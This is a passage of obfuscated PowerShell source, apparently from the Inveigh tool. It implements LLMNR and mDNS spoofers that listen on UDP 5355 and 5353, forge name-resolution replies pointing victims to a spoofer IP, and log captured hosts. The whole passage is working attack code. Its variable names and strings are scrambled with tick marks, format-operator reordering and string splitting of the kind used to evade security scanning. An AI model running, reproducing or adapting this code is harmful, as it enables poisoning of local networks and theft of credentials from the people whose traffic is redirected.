                                            ${i`Nv`EigH}."L`oG".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252 "))
                                        }

                                    }

                                }

                                if((${IN`VEi`gh}."VaL`I`D_HOSt_lISt" -notcontains ${LlmNR`_QU`e`RY_`st`RIng} -or ${spOo`F`ERHoS`TsrEPLy} -contains ${LlmNr`_q`UEr`Y`_`STRiNg}) -and (!${S`pO`ofERHoStSR`EP`Ly} -or ${s`p`ooFe`Rh`ostSRePlY} -contains ${LLmnr`_quER`Y_`StRI`Ng}) -and (
                                !${spOoferhO`sts`Ig`NORe} -or ${S`p`oOFERh`ost`si`gNORe} -notcontains ${llmnR`_Q`U`E`RY`_string}) -and (!${SP`oO`Fer`IPSREPlY} -or ${spo`O`FeRI`PS`REPLy} -contains ${S`oU`RC`e_Ip}) -and (
                                !${s`POOf`ErIPsigN`ORe} -or ${SPooFErI`ps`IGN`ORe} -notcontains ${s`ou`RCE_Ip}) -and (${INv`E`IGH}."Spo`of`E`R_`RepeAT" -or ${Invei`GH}."Ip_C`ApT`U`R`E_liST" -notcontains ${s`Ou`RcE_ip}."ip`AddREs`Stos`TR`InG") -and (
                                ${SPOo`Fer`LeAr`N`inG} -eq 'N' -or (${s`p`oOF`eRleaRnI`Ng} -eq 'Y' -and !${s`pO`OfERlEaR`N`i`Ng`DElay}) -or (${sp`ooF`ERleAr`NinGDelAY} -and ${s`PO`OfEr_`LeArNIn`G`_sTopw`AtCH}."eL`Aps`ed" -ge ${sPO`OfER_`LEaRNING_d`El`Ay})))
                                {

                                    if(${SPOofe`RLEAR`N`i`NG} -eq 'N' -or !${LL`mnr_`lEArN`Ing_LOg}.("{2}{0}{1}" -f'xis','ts','E').Invoke({param(${s}) ${S} -like "* " +  ( &("{3}{4}{0}{2}{1}" -f'lDI','EM','t','g','et-chI')  ('VarIaBl'+'E:Cy'+'j'+'6e1') ).ValuE::"tOS`TR`iNg"(${P`AyLOAD`_by`T`eS}[0..1]) + " *"}))
                                    {
                                        ${l`lM`NR_Se`ND_socKeT} = &("{3}{2}{1}{0}" -f'ect','j','b','New-O') ("{0}{4}{6}{3}{1}{2}{5}" -f'Sy','s.','Socke','ket','stem.Net.','t','Soc')(  (  &("{0}{1}{2}"-f 'gE','T','-vaRiAbLe') H1TLV  ).vALuE::"inteRN`Etw`o`Rk", (  &("{3}{2}{1}{0}"-f 'rIaBLe','va','-','gET') 16g  -ValueOn  )::"r`AW", $qB64Xy::"u`dp" )
                                        ${l`l`mNR_SeNd_s`ocK`eT}."Sen`dBu`F`FeRs`IZE" = 1024
                                        ${lL`mN`R_dESti`Natio`N_pO`inT} = &("{3}{2}{0}{1}"-f 'Objec','t','w-','Ne') ("{2}{0}{1}{3}{4}" -f'stem','.','Sy','Net.IPEndpo','int')(${sOu`Rce_`iP},${E`NdP`OinT`_SOURce_pOrt}) 
                                        ${L`lMnr_sen`d_`S`o`CKeT}.("{0}{1}" -f'SendT','o').Invoke(${LLM`NR_rEspO`NsE_pa`ck`et},${lL`mNR`_`D`estiNaTion_p`O`InT})
                                        ${l`L`mnR`_`se`ND_socKet}.("{0}{1}"-f'Clos','e').Invoke()
                                        ${lLMN`R_`ResPONSE_m`E`s`sA`gE} = ("{3}{1}{2}{0}{4}" -f 'n','respo','nse se','- ','t')
                                    }
                                    else
                                    {
                                        ${L`l`M`Nr_REqUe`st_IGNo`RE} = ${tr`UE}
                                    }
                                }
                                else
                                {

                                    if(${sPOOFer`HO`sTSRe`PLY} -and ${SP`oofEr`H`ostsReplY} -notcontains ${lL`Mnr`_`Q`UErY_stRINg})
                                    {
                                        ${lLMN`R_r`ESpOnse_`Me`S`saGe} = ('- '+"$LLMNR_query_string "+'is'+' '+'not'+' '+'o'+'n '+'re'+'pl'+'y '+'lis'+'t')
                                    }
                                    elseif(${s`poO`Ferh`osTSi`gnORE} -and ${SpoofeRh`os`Tsi`G`NORE} -contains ${LlMnR_QUERY_`S`TR`InG})
                                    {
                                        ${l`l`mnR_R`esPOnsE_MEssAge} = ('- '+"$LLMNR_query_string "+'is'+' '+'on'+' '+'igno'+'re '+'li'+'st')
                                    }
                                    elseif(${sPoo`Fe`RIp`Sre`Ply} -and ${S`poOFeR`IPsrEP`LY} -notcontains ${S`ouRC`E_IP})
                                    {
                                        ${lL`mnR_re`s`POnS`e_meS`sAgE} = ('- '+"$source_IP "+'i'+'s '+'n'+'ot '+'o'+'n '+'r'+'eply'+' '+'lis'+'t')
                                    }
                                    elseif(${s`Po`oferips`IGnorE} -and ${sPOofe`RipSi`Gn`o`Re} -contains ${s`OurCe`_Ip})
                                    {
                                        ${ll`mnr_`R`ESpONse_meS`sA`gE} = ('- '+"$source_IP "+'i'+'s '+'o'+'n '+'ig'+'nore'+' '+'lis'+'t')
                                    }
                                    elseif(${In`VEIgH}."VA`lID_HOst_`L`ISt" -contains ${Llm`N`R_QUErY_`ST`RInG})
                                    {
                                        ${l`lmNr_rEsp`On`sE_MESSAgE} = ('- '+"$LLMNR_query_string "+'i'+'s '+'a '+'val'+'id '+'h'+'ost')
                                    }
                                    elseif(${INV`eigH}."I`P_`capt`URE_lIst" -contains ${So`U`Rce`_Ip}."i`PaDd`RE`SsTo`StriNg")
                                    {
                                        ${llMn`R`_`Re`s`ponSE_meS`saGe} = ('- '+'previo'+'us'+' '+'captur'+'e'+' '+'fro'+'m '+"$source_IP")
                                    }
                                    elseif(${s`poOFE`R`LEAR`NiNGDeLAY} -and ${Spo`oF`e`R_`lEARNi`NG`_`St`OPWaTcH}."eL`Aps`ed" -lt ${SpO`oFEr`_`leAr`NiNG_`DElay})
                                    {
                                        ${lLMnR_`ResPons`E`_MESs`AgE} = "- " + [Int](${SPoO`FeRLe`Ar`N`I`NGdE`lay} - ${SpOOfe`R_LeaRNIN`G_`sto`pWa`TCH}."elAP`sED"."ToTa`lm`inuT`ES") + (("{4}{8}{1}{3}{9}{2}{6}{5}{7}{0}"-f's',')','f',' unt',' minu',' st','ing','art','te(s','il spoo'))
                                    }
                                    else
                                    {
                                        ${LL`Mn`R_rEspOn`se_me`Ssa`gE} = ("{1}{4}{3}{2}{0}"-f'rong','-','w','ng went ',' somethi')
                                    }
                                
                                }
                            
                            }

                            if(!${lL`MnR_`Re`q`U`eST`_IgnoRE})
                            {
                                ${IN`V`eIGH}."C`On`sOLE_Que`UE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))

                                if(${I`NVe`IGH}."f`I`Le_o`UtpUT")
                                {
                                    ${i`N`VEiGh}."L`og_`FilE`_`quEuE".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                                }

                                if(${I`NvEigH}."lOG`_o`Utp`UT")
                                {
                                    ${In`Vei`gh}."L`OG".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                                }

                            }

                        }

                    }

                }

                switch(${endP`o`IN`T_`SourcE_POrt})
                {

                    5355 
                    {
                    
                        if(${sPOO`FeR`L`EaRNInG} -eq 'Y' -and ${lLMNr_l`EA`RNIng`_LOg}.("{0}{2}{1}"-f'E','s','xist').Invoke({param(${S}) ${S} -like "* " +   (  &("{0}{2}{1}" -f 'va','e','riabL')  ('cy'+'J6E1') ).vAlUe::"TOSt`Ring"(${p`AYl`oad_bYtES}[0..1]) + " *"}))
                        {
                            ${L`LmN`R_q`UeRy} =  (  &("{2}{0}{1}"-f 'RIaBL','e','Va') Cyj6E1  ).valUe::"T`Os`TRing"(${payl`oa`d_BytES}[13..(${PAyLo`Ad_B`Y`Tes}[12] + 13)])
                            ${l`Lmn`R_qUERY} = ${LLMN`R_qu`eRy} -replace "-00",""

                            if(${LLMNr`_`q`UEry}."LEn`g`Th" -eq 2)
                            {
                                ${llMn`R_qu`ery} = [Char]  $IGU7qM::("{1}{0}"-f 't16','ToIn').Invoke(${lLm`Nr_`queRy},16)
                                ${LLMn`R`_`QUERy_`StrI`NG} = &("{1}{2}{0}" -f'bject','N','ew-O') ("{1}{2}{0}"-f 'm.String','Sys','te')(${l`Lmnr_`qUerY})
                            }
                            else
                            {
                                ${lLMNr_qU`E`Ry} = ${LL`MnR_`QuE`RY}.("{0}{1}"-f'S','plit').Invoke("-") | &("{2}{4}{3}{0}{1}" -f'c','t','ForEac','je','h-Ob'){[Char]  $Igu7Qm::("{1}{0}"-f'6','ToInt1').Invoke(${_},16)}
                                ${LlM`NR_q`UeRy_St`RING} = &("{2}{0}{1}" -f 'O','bject','New-') ("{0}{3}{1}{2}"-f 'S','tri','ng','ystem.S')(${l`LmNr`_QueRY},0,${Ll`MnR_`qUE`RY}."LE`NGTh")
                            }
                            
                            [Byte[]]${Ll`m`Nr_`ReSp`Onse_Ip_b`yTES} = ${PAYloA`d`_by`TEs}[(${P`AYLOaD`_bYTES}."L`EnGTH" - 4)..(${PaY`lo`Ad`_B`YTeS}."L`eN`GTh")]
                            ${lLMNr_`RespO`NsE_`iP} = [System.Net.IPAddress]${lLM`NR_reSP`O`Nse_`I`p_by`T`eS}
                            ${lLM`NR_RE`SP`ONSe`_IP} = ${LlmNR_rE`S`P`O`Nse_`iP}."IpA`d`dRE`sSToSTRiNG"
                            
                            if(${iN`VeI`gH}."valId_HOST_`L`ist" -notcontains ${LlMn`R_q`U`eR`Y_sTRI`NG})
                            {
                                ${I`Nveigh}."V`ALid_`hOST`_`lIst".("{0}{1}" -f'Ad','d').Invoke(${llmN`R_q`UerY`_`s`TRInG})
                                ${i`Nve`Igh}."cOn`S`OlE_qUeuE".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list "))

                                if(${I`N`VeIGH}."File_oU`T`PUt")
                                {
                                    ${iN`V`eiGH}."lOg`_`FIL`E_qU`eUe".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list "))
                                }

                                if(${iNV`Ei`GH}."LOg`_OU`TPut")
                                {
                                    ${i`Nv`eiGh}."l`og".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list "))
                                }

                            }
                            
                        }

                    }

                }

            }

        }

    }

    ${B`Ina`RY_`R`EaDEr}.("{1}{0}"-f'lose','C').Invoke()
    ${Me`M`o`Ry_StR`EAm}.("{1}{2}{0}"-f'se','D','ispo').Invoke()
    ${mEmOrY`_`StreaM}.("{1}{0}"-f'ose','Cl').Invoke()
}


${LLM`Nr_sPooF`Er`_sC`Rip`TbLOCk} = 
{
    param (${IN`speCt},${LLmN`R_R`esPO`NsE_m`EsSA`gE},${S`PoO`FeriP},${sPOO`Fe`R`hOs`T`SRePLy},${SP`OOfeR`HoStSi`GNOrE},${sPoO`F`e`RIPSREply},${s`POoFE`RI`psIgnOre},${lLMnRT`Tl})

    ${llMnR_`Ru`Nn`iNG} = ${tr`Ue}
    ${L`LmNr`_LISt`EnEr`_`E`N`DpOInT} = &("{0}{1}{2}" -f 'New-','objec','t') ("{4}{3}{0}{5}{2}{1}" -f '.','t','n','Net','System.','IPEndPoi') (  ( &('LS') ('vA'+'riAbLE:'+'j91G'+'q'+'K') ).VaLuE::"a`Ny",5355)

    try
    {
        ${l`l`MNr`_Ud`P_Cl`IenT} = &("{2}{1}{0}" -f'ect','ew-Obj','N') ("{1}{0}{2}{3}{4}"-f 'tem.','Sys','Ne','t.','Sockets.UdpClient') 5355
    }
    catch
    {
        ${I`NVeIGh}."CoNs`olE`_q`Ueue".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Error starting LLMNR spoofer "))
        ${Llm`NR_`RunnI`Ng} = ${Fal`SE}

        if(${INV`e`igh}."Fi`Le_out`P`Ut")
        {
            ${inv`E`igH}."lOg_`F`ile`_quEue".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting LLMNR spoofer "))
        }

        if(${I`Nv`eIgh}."L`Og_`OUTPut")
        {
            ${invE`IGh}."L`OG".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - Error starting LLMNR spoofer "))
        }

    }

    ${L`l`MNr_`Mult`IcAS`T_gRo`Up} = [IPAddress]("{0}{3}{2}{1}" -f '2','2','25','24.0.0.')
    ${LlMnr_`UD`P`_`cLIENT}.("{4}{3}{0}{1}{2}"-f'tic','astGro','up','inMul','Jo').Invoke(${Ll`m`N`R_`mul`TICasT_GRo`Up})
    ${LlMNR`_u`Dp_CL`i`E`Nt}."clIE`NT"."ReCeI`VETIMe`Out" = 5000
    ${l`L`mnR_T`T`l_BYTEs} =  $cYj6e1::("{0}{1}{2}"-f'G','etB','ytes').Invoke(${L`LM`NRTtL})
      ( &('Gi') ('V'+'Ar'+'iAB'+'Le:3xp')  ).vALUE::("{1}{2}{0}" -f 'e','Rever','s').Invoke(${l`l`m`NR`_tTl_`BYTes})

    while(${I`N`VeigH}."rU`Nn`iNg" -and ${Llmn`R_`Run`NiNG})
    {   

        try
        {
            ${llmNR_re`q`UESt_d`AtA} = ${lLMn`R`_`Ud`p_Cli`EnT}."re`CEive"([Ref]${Llm`N`R_LI`Stener_enDp`O`iNT})
        }
        catch
        {
            ${LLm`N`R_u`dp`_cLieNt}.("{0}{1}"-f 'Clos','e').Invoke()
            ${llm`N`R_uDp`_ClIEnt} = &("{1}{3}{0}{2}"-f'je','ne','ct','w-Ob') ("{3}{6}{0}{7}{4}{5}{1}{2}" -f '.N','Clien','t','Sys','ck','ets.Udp','tem','et.So') 5355
            ${l`LMNR_mU`LTiC`AST_GrOup} = [IPAddress]("{3}{1}{0}{2}"-f'0.','4.0.','252','22')
            ${LLm`Nr_UdP_`clI`eNt}.("{3}{0}{1}{2}"-f 'n','Multic','astGroup','Joi').Invoke(${lLmN`R`_M`Ult`iCasT`_GROUp})
            ${LlmNR_`UD`P`_cLIenT}."CL`iEnt"."REceI`Ve`TI`M`Eout" = 5000
        }

        if(${llmNR_Re`Qu`e`s`T_DA`Ta} -and   $cyj6e1::"T`osTrINg"(${l`LMNR_rEQ`UEsT`_`DA`TA}[(${llMNR_r`eQ`U`es`T_DATa}."l`en`GtH" - 4)..(${LlMN`R_req`UEs`T`_`dA`Ta}."lENG`TH" - 3)]) -ne ("{0}{1}" -f '00-','1c')) 
        {

            ${LLm`NR_ReS`Po`NsE`_PACKeT} = ${llmn`R_req`UE`ST`_dA`Ta}[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     ${LLMnr_RE`q`U`esT_DATA}[12..${LLMNR`_`REqueST`_`dATA}."leN`gtH"] +
                                     ${L`LM`Nr_`REq`UeS`T_DAtA}[12..${lLMn`R_ReQ`UES`T_datA}."Le`NG`Th"] +
                                     ${L`LmnR_`TtL_`BYTeS} +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]${spOof`ER`ip})).("{0}{1}{2}" -f 'GetA','ddressByt','es').Invoke()
        
            ${LlMn`R`_qU`Ery_sT`RIng} =   (  &("{1}{2}{0}" -f'IABle','v','AR') IpJAs  -vAlU  )::"u`TF8"."GeT`stRi`Ng"(${L`LM`N`R_ReQUE`ST_DATa}[13..(${LLmnr_`R`Eq`UEs`T_D`Ata}[12] + 12)])     
            ${sour`ce_`iP} = ${l`LmN`R_`LiStEn`E`R_e`NDpO`iNT}."AD`d`ReSS"."I`paD`DrEssTOst`RI`NG"

            if(!${IN`speCt} -and (${Ll`M`NR_re`QUe`ST_Data} -and ${LLmnR_l`i`s`TENeR_eN`DPOiNT}."AD`dress"."IP`Add`RESSToSt`RIng" -ne ("{0}{1}" -f '0.0.','0.0')) -and (!${sP`oOF`ERhOst`srE`p`Ly} -or ${SP`O`OfERhosTsr`eplY} -contains ${LL`M`NR`_`qUerY_Str`InG}) -and (
            !${SpO`oFE`R`hoStsiGNorE} -or ${sPoOFe`Rho`ST`SI`gN`ORe} -notcontains ${LLMNR_qUeR`Y`_stR`iNG}) -and (!${Spo`oFEr`iPSR`E`Ply} -or ${SpOOf`er`ipSreP`lY} -contains ${SoUrcE`_`iP}) -and (!${sPO`oFeRips`I`G`NORE} -or ${SpOOFerI`PSiG`N`Ore} -notcontains ${so`Ur`CE`_Ip}) -and (
            ${I`NVeiGh}."Sp`oOF`er_RE`PE`AT" -or ${I`NVe`iGh}."iP_caPT`URE`_`LIST" -notcontains ${Sour`CE_`ip}))
            {
                ${LLmNR_`de`sTin`AtION_`eNDpOINt} = &("{1}{0}{2}"-f'w','Ne','-Object') ("{3}{2}{0}{1}" -f 'dp','oint','t.IPEn','Ne')(${l`L`Mnr_l`iSteNE`R`_En`dpOINT}."Ad`dresS",${Llm`Nr_lISteNer_e`Nd`Po`inT}."Po`Rt")
                ${LLmN`R`_UdP`_`CLiEnT}.("{0}{1}" -f'Con','nect').Invoke(${Llmnr_dEs`Tin`At`i`On_ENdPOiNT})
                ${L`lMn`R_U`DP_C`LiEnT}.("{1}{0}"-f'd','Sen').Invoke(${l`L`mnR_`RespoNs`E`_pac`KEt},${ll`mN`R`_rE`sPONsE_`pACk`Et}."lenG`TH")
                ${l`lm`N`R`_udP_c`LiEnt}.("{0}{1}" -f'Cl','ose').Invoke()
                ${L`lmn`R`_uDP`_`clIenT} = &("{3}{1}{2}{0}" -f 't','Ob','jec','new-') ("{5}{3}{1}{0}{2}{4}{7}{6}" -f'Net.Soc','em.','ke','st','ts.','Sy','t','UdpClien') 5355
                ${Ll`mnr_`MuLTi`cast_G`R`OuP} = [IPAddress]("{1}{0}{2}"-f '24.0.','2','0.252')
                ${Llm`N`R_U`DP_Cl`I`ENt}.("{0}{3}{4}{1}{2}"-f 'JoinMul','castGrou','p','t','i').Invoke(${lL`MnR`_`mulTI`casT_`Gr`Oup})
                ${l`L`mnr`_udP_C`lIent}."c`LiENT"."re`cEIv`etI`mEOut" = 5000
                ${LL`MNr`_Resp`on`se_mEsSage} = ("{2}{3}{0}{1}"-f 'n','t','-',' response se')
            }
            else
            {

                if(${iN`S`PECT})
                {
                    ${ll`MNR_`REsP`OnsE_`M`ES`Sage} = ("{2}{3}{1}{0}" -f 'nly','ect o','- ','insp')
                }
                elseif(${SpOofER`hOsTsr`EP`LY} -and ${sP`O`OfERHOs`TsrE`Ply} -notcontains ${llm`NR_qUe`R`y_s`T`RinG})
                {
                    ${lLM`N`R_re`SPon`Se_`Me`ssAge} = ('- '+"$LLMNR_query_string "+'i'+'s '+'not'+' '+'o'+'n '+'reply'+' '+'li'+'st')
                }
                elseif(${SPo`OFe`Rh`oS`T`sIGnOrE} -and ${s`POofErhO`S`T`SI`gnoRE} -contains ${LLmNR_QuER`y`_s`TRIng})
                {
                    ${llMN`R`_RESp`oNse_mEss`AGE} = ('- '+"$LLMNR_query_string "+'i'+'s '+'o'+'n '+'ign'+'ore'+' '+'l'+'ist')
                }
                elseif(${SP`OoFeRi`p`sRe`pLy} -and ${spO`OfE`RIPSrE`plY} -notcontains ${SO`UrCE`_iP})
                {
                    ${ll`MNR_ReS`poNS`E_MeSS`A`GE} = ('- '+"$source_IP "+'is'+' '+'n'+'ot '+'on'+' '+'re'+'p'+'ly '+'l'+'ist')
                }
                elseif(${SPOO`F`eRi`p`S`iGNORe} -and ${S`P`oOFErI`PS`iG`Nore} -contains ${SO`URc`E_IP})
                {
                    ${llmn`R`_r`ES`PoNS`E_me`ssAge} = ('- '+"$source_IP "+'is'+' '+'on'+' '+'ignor'+'e '+'l'+'ist')
                }
                elseif(${iNV`Ei`gH}."ip_Ca`p`T`Ure_lIsT" -contains ${s`Ource`_`Ip})
                {
                    ${LlmNr_`RESPOnS`E`_`MEs`sAGe} = ('- '+'previ'+'o'+'us '+'captur'+'e'+' '+'from'+' '+"$source_IP")
                }
                else
                {
                    ${LLM`N`R`_ReSPOnse_`MeSs`A`gE} = ("{3}{2}{4}{0}{1}"-f 'ron','g','somet','- ','hing went w')
                }
                                
            }
        
            if(${l`lM`NR_`R`e`QuEST_datA})                   
            {
                ${in`VEI`GH}."CoN`So`Le_qU`eUE".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))

                if(${iNve`i`gh}."filE_o`U`TP`UT")
                {
                    ${i`NVei`GH}."lOG_fI`lE_`QUEue".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                }

                if(${i`NVei`Gh}."log`_ouTp`UT")
                {
                    ${inVe`IgH}."l`oG".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                }

            }

            ${llMnr_req`U`ESt_`Data} = ""
        }

    }

    ${L`L`M`Nr_U`dp_clIeNt}.("{1}{0}" -f'se','Clo').Invoke()
 }


${MD`NS_`S`PoOFer_`s`CRiptb`l`ocK} = 
{
    param (${i`NSP`ECT},${M`D`NS_`RESpONSe`_mes`s`AGE},${Md`NSt`TL},${M`DNST`YpES},${SpO`Of`eRIp},${spOO`F`ErHos`Tsr`ep`lY},${SpoOfeRhOS`TsI`gNo`Re},${SPOO`F`eR`ipSR`epLy},${spoo`Fe`RiPsig`NOrE})

    ${M`Dn`s_ru`N`NING} = ${tR`UE}
    ${m`D`Ns_LisT`EnE`R`_EnDpOi`Nt} = &("{0}{1}{2}"-f 'New-o','b','ject') ("{0}{1}{2}{3}" -f'System.','Net.IPE','nd','Point') (  (&("{1}{2}{0}" -f 'e','GeT-variAB','L') J91GQK -VAlUeOnLy  )::"a`NY",5353)

    try
    {
        ${MDNS_UDP_`c`Li`enT} = &("{0}{1}{2}" -f 'New-O','bj','ect') ("{1}{3}{0}{5}{2}{7}{6}{4}" -f 'Socket','System.N','pC','et.','nt','s.Ud','e','li') 5353
    }
    catch
    {
        ${Inv`E`igH}."C`o`NSoLe_quEUE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Error starting mDNS spoofer "))
        ${md`NS_RUn`NiNG} = ${F`Alse}

        if(${INv`eIgH}."fI`LE`_`ouTpUt")
        {
            ${i`Nve`igh}."Lo`G_`FIl`e_QUEue".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Error starting mDNS spoofer "))
        }

        if(${INVe`i`gh}."log_ou`T`puT")
        {
            ${I`NVe`IGh}."l`oG".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Error starting mDNS spoofer "))
        }

    }

    ${M`dns_Mu`LT`Ica`ST_G`ROUP} = [IPAddress]("{0}{2}{1}"-f '224.0','51','.0.2')
    ${MdNs_`UD`p_C`l`iEnT}.("{3}{0}{1}{2}" -f'ulticastG','ro','up','JoinM').Invoke(${m`Dns_m`UlTicaST`_gRoUP})
    ${mD`N`S_Udp`_CLIEnt}."clIe`Nt"."rECEI`VE`Ti`MeouT" = 5000
    ${mdNS_t`TL`_`Byt`eS} =   $Cyj6E1::("{1}{0}{2}" -f 'et','G','Bytes').Invoke(${md`NST`TL})
     ( &("{2}{1}{3}{0}"-f'BLE','-vaRI','GEt','A') 3XP  -vaLueo)::("{1}{2}{0}" -f 'verse','R','e').Invoke(${mdNS_tt`l`_B`YTES})

    while(${In`VEi`GH}."RU`NNIng" -and ${mDNs_r`U`NNI`NG})
    {   

        try
        {
            ${M`DNs`_`REQ`UE`st_dAtA} = ${mdnS_UDp`_`cli`EnT}."RE`cei`VE"([Ref]${MdNS`_LiS`T`eNE`R_`Endp`oInt})
        }
        catch
        {
            ${M`dN`s`_UDP_ClI`enT}.("{1}{0}" -f 'e','Clos').Invoke()
            ${M`dnS_`UdP_CliE`NT} = &("{1}{0}{2}" -f'je','new-Ob','ct') ("{3}{2}{4}{1}{5}{6}{0}"-f 'lient','m.N','y','S','ste','et.Soc','kets.UdpC') 5353
            ${MDN`S_m`ULtICAs`T`_GRoUp} = [IPAddress]("{1}{0}{3}{2}" -f'.0.0.2','224','1','5')
            ${Md`NS`_uDp_`CL`IENt}.("{1}{0}{3}{4}{2}{5}" -f 'Mul','Join','tGro','tic','as','up').Invoke(${m`Dns_m`ULti`caST`_GROuP})
            ${MdnS_`U`d`P_C`lIENT}."C`lie`Nt"."rE`CEI`VET`IMEOUT" = 5000
        }
        
        if( (&("{2}{1}{0}{3}" -f'A','t-v','GE','riaBLE') CYj6e1 ).ValUe::("{1}{0}" -f'ing','ToStr').Invoke(${mDn`s`_`REQue`st`_daTA}) -like ("{2}{1}{3}{0}" -f '1','1-','*-00-0','80-0'))
        {
            ${mDNS`_Res`poNs`E_Pac`K`eT} = ${mDNS_Req`UES`T_D`ATA}[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    ${m`Dns_REqu`ESt`_D`ATA}[12..(${Md`Ns_ReQ`U`EsT_DatA}."Le`NGTh" - 5)] +
                                    0x00,0x01,0x00,0x01 +
                                    ${mdn`S_tT`L`_B`YtEs} +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${spO`O`Fe`RIp})).("{3}{2}{1}{0}"-f'tes','sBy','res','GetAdd').Invoke()
                        
            ${mDNs_QUER`y`_`sTr`INg} = &("{1}{3}{2}{0}" -f 'g','Data','oStrin','T') 13 ${MdNs_`ReQu`esT_DA`Ta}[12] ${M`d`Ns_rEQue`S`T_`datA}
            ${mdNS_qUEr`Y`_stR`I`N`G_fU`lL} = ${M`dN`S`_qu`eRy_sTriNG} + ("{0}{2}{1}"-f'.l','l','oca')   
            ${S`OuRC`E_Ip} = ${mdns`_`LiSt`E`N`eR_E`NDpOiNt}."AdD`ReSS"."IPadDrESs`To`S`T`RInG"

            if(!${INs`Pe`Ct} -and (${mDns_R`EQ`UE`ST_dATa} -and ${mDns_l`isTEner_eND`PoI`NT}."ADD`R`ESS"."IpaDdrES`S`T`oS`TRiNg" -ne ("{2}{0}{1}"-f'.','0.0','0.0')) -and (!${s`POOf`ERHoS`TS`Rep`ly} -or ${sPoo`F`Erh`Os`Tsre`pLy} -contains ${mdn`s_`QUeR`Y_s`T`RiNG}) -and (
            !${spoo`FER`HO`sTsig`No`RE} -or ${s`p`ooFeRhOs`TSIGnORe} -notcontains ${M`dNs`_query_`sTRing}) -and (!${spoOf`Eri`PS`REP`Ly} -or ${S`pO`Oferip`sRe`ply} -contains ${S`oU`Rce_Ip}) -and (!${SPoofeR`Ip`SI`g`NORE} -or ${sp`oOfEr`IPsi`Gn`ore} -notcontains ${s`OUrCE`_`IP}) -and (
            ${MdnS`T`YPes} -contains 'QU') -and (${iN`VeiGH}."SPo`OFe`R`_RePEAt" -or ${inv`EI`Gh}."IP_C`A`PtU`Re_lI`ST" -notcontains ${sou`RCE_`ip}))
            {
                ${MdNs_DEs`T`INaTIOn_E`N`DpoInt} = &("{2}{1}{0}" -f 'bject','O','New-') ("{1}{2}{3}{0}" -f'int','Net.IP','End','po')(${M`Dns`_lIS`Ten`Er`_eNDPoINt}."ad`DrE`Ss",${MD`Ns_`liSTeN`eR_En`Dpoint}."pO`Rt")
                ${mDN`s_U`Dp`_cL`I`ENt}.("{1}{0}{2}"-f'onn','C','ect').Invoke(${mdns_D`estINATi`on`_ENDpOI`Nt})
                ${MDN`s_U`Dp_Cli`ent}.("{0}{1}" -f 'Sen','d').Invoke(${MDns_r`E`SPOns`e_p`Acket},${m`dNs_REs`ponsE_`pa`cKeT}."len`G`Th")
                ${mdNs`_`U`dp_CLienT}.("{1}{0}"-f'ose','Cl').Invoke()
                ${mdN`s_u`D`p_`clIENT} = &("{1}{2}{0}"-f 't','ne','w-Objec') ("{1}{4}{0}{3}{2}"-f 'ckets.','Syste','pClient','Ud','m.Net.So') 5353
                ${MDn`S_mUltiC`ASt_`gr`o`UP} = [IPAddress]("{1}{0}{3}{2}" -f'4.0.0.','22','51','2')
                ${mD`NS_`UDp_`ClIe`Nt}.("{0}{4}{2}{3}{1}" -f 'JoinMul','oup','icastG','r','t').Invoke(${mdN`s`_mu`lTicas`T`_GrOUp})
                ${M`D`N`S_`UdP_ClIent}."C`Li`eNT"."ReC`eI`VETIme`O`UT" = 5000
                ${MdnS`_Res`PoN`se_ME`SsAGE} = ("{0}{2}{1}{3}"-f'- re','ponse ','s','sent')
            }
            else
            {

                if(${I`N`SPECT})
                {
                    ${M`DNs_R`Es`Ponse`_M`esSAGe} = ("{1}{3}{2}{0}"-f'y','- i','pect onl','ns')
                }
                elseif(${m`DNsTy`PES} -notcontains 'QU')
                {
                    ${MdNS_r`esPOnse_`Mess`A`GE} = ("{1}{3}{0}{2}"-f'd mDN','- dis','S type','able')
                }
                elseif(${SpOo`Ferh`oS`T`SREpLy} -and ${S`POo`F`E`RhosTSREplY} -notcontains ${mdns_`qU`E`Ry_`sTRINg})
                {
                    ${MdnS`_ReSPO`N`SE`_MesS`A`GE} = ('- '+"$mDNS_query_string "+'i'+'s '+'no'+'t '+'o'+'n '+'repl'+'y '+'l'+'ist')
                }
                elseif(${S`P`ooFeR`hO`sTsIGnO`Re} -and ${SpO`ofERhoStS`IGN`oRE} -contains ${M`DNS_`Qu`e`RY_sTR`INg})
                {
